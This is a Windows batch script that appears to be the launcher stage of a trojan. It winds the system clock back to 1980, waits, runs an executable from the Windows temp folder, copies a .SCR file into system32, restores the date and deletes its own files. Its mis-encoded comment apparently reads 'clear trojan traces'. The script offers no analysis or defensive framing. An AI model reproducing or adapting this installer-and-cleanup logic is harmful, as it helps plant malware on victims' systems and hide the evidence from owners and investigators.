
@echo off
if exist %systemroot%\temp\wm del /S /Q %systemroot%\temp\1.exe del /S /Q %systemroot%\temp\1.vbs del /S /Q %systemroot%\temp\1.bat
if exist %systemroot%\temp\wm exit
md %systemroot%\temp\wm
date 1980-01-01
date 1980-01-01
@echo off & setlocal enableextensions
echo WScript.Sleep 1000 > %temp%.\tmp$$$.vbs
set /a i = 5
:Timeout
if %i% == 0 goto Next
setlocal
set /a i = %i% - 1
cscript //nologo %temp%.\tmp$$$.vbs
goto Timeout
goto End
:Next
%systemroot%\temp\1.exe
copy %systemroot%\temp\mv.SCR %systemroot%\system32\
for %%f in (%temp%.\tmp$$$.vbs*) do del %%f
date 2007-03-11
::===============Çå³ýÄ¾ÂíºÛ¼£=================
del /S /Q %systemroot%\temp\1.exe
del /S /Q %systemroot%\temp\1.vbs
del /S /Q %systemroot%\temp\1.bat